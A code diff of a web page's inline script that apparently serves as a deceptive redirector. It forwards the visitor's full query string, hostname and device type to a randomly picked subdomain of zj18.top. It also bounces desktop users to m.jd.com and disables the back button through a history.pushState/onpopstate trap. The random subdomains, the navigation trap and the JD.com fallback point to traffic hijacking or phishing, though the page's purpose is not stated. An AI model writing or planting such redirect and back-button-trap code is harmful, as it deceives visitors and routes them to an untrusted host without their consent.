@@ -40,67 +40,29 @@ let screenHeight = window.screen.height;
 if (screenWidth >= 768) {
     window.location.href = "https://m.jd.com";
 }
-function GetQueryString(name) {
-      const query = window.location.href.split('?')[1];
-      if (!query){
-          let rawHost = document.domain || '';
-      if (!rawHost || rawHost === rawHost.toLowerCase()) {
-        const urlMatch = window.location.href.match(/^https?:\/\/([^\/?#:]+)/);
-        if (urlMatch && urlMatch[1]) {
-          rawHost = urlMatch[1];
-        }
-      }
-      const dotIndex = rawHost.indexOf('.');
-      if (dotIndex > 0) {
-        const str = rawHost.substring(0, dotIndex);
-        return str;
-      }
-      };
-      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
-      const r = query.match(reg);
-      if (r != null) return decodeURIComponent(r[2]);
-      return null;
+function getOriginalPathParam() {
+    const href = window.location.href;
+    const paramPart = href.split('?')[1];
+    return paramPart ? paramPart.trim() : '';
 }
-function GetFirstParamValue() {
-  const query = window.location.href.split('?')[1];
-  if (!query) return null;
-  const params = query.split('&');
-  for (let param of params) {
-    if (param.includes('=')) {
-      const name = param.split('=')[0];
-      if (name && name.length === 2) {
-        const value = param.split('=')[1];
-        return decodeURIComponent(value);
-      }
-    } else {
-      continue;
-    }
-  }
-  return null;
-}
-var bucket = GetQueryString("bucket");
-let str = GetQueryString();
-if(!str){
-    str = GetFirstParamValue();
-}
-var uopenid = GetQueryString("uopenid");
-var type = GetQueryString("type");
+var originalParam = getOriginalPathParam();
 var sign = Date.now();
-var openid = "";
 function customJump() {
     const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link'];
     const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
     const targetDomain = `${randomSub}.zj18.top`;
-    const params = new URLSearchParams();
-    params.append('bucket', bucket || '');
-    params.append('ic', str || '');
-    params.append('sign', sign);
-    params.append('type', type || '');
-    params.append('_wv', '9983');
-    params.append('from', window.location.hostname);
-    params.append('t', new Date().getTime());
-    params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
-    const targetUrl = `http://${targetDomain}?${params.toString()}`;
+    let targetUrl = `https://${targetDomain}`;
+    if (originalParam) {
+        targetUrl += `?${originalParam}`;
+    }
+    const extraParams = new URLSearchParams();
+    extraParams.append('from', window.location.hostname);
+    extraParams.append('t', new Date().getTime());
+    extraParams.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
+    const extraStr = extraParams.toString();
+    if (extraStr) {
+        targetUrl += (originalParam ? '&' : '?') + extraStr;
+    }
     opensdk(targetUrl);
 }
 setTimeout(customJump, 1000);
@@ -108,14 +70,14 @@ setTimeout(function() {
     location = "https://m.jd.com/" + new Date().getTime();
 }, 10000);
 </script>
-    <script>
-        if (window.history && window.history.pushState) {
-            history.pushState(null, null, location.href);
-            window.onpopstate = function() {
-                history.go(1);
-            };
-        }
-    </script>
+<script>
+if (window.history && window.history.pushState) {
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.go(1);
+    };
+}
+</script>
 </head>
 <body>
 </body>
